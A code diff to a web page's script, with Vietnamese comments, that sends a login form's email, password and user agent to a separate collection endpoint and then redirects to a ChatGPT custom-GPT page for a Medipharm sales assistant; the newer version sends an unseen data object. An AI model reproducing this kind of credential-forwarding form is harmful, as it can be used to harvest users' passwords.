@@ -95,23 +95,19 @@
       };
 
       fetch(scriptURL, {
-      method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-         body: JSON.stringify({
-           email: email,
-          password: pass,  // nếu muốn gửi mật khẩu
-        userAgent: navigator.userAgent
-    })
-  })
-.then(response => response.text())
-.then(result => {
-  console.log('Success:', result);
-  window.location.href = "https://chatgpt.com/g/g-67e69d0bd2008191873e8b9f07889a5c-tro-ly-ban-hang-medipharm";
-})
-.catch(error => {
-  console.error('Error:', error);
-  errorBox.textContent = "Đã xảy ra lỗi, vui lòng thử lại.";
-});
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      })
+      .then(() => {
+        // Sau khi gửi xong thì redirect
+        window.location.href = "https://chatgpt.com/g/g-67e69d0bd2008191873e8b9f07889a5c-tro-ly-ban-hang-medipharm";
+      })
+      .catch(err => {
+        console.error('Lỗi gửi dữ liệu:', err);
+        errorBox.textContent = "Đã xảy ra lỗi, vui lòng thử lại.";
+      });
     }
   </script>
 </body>
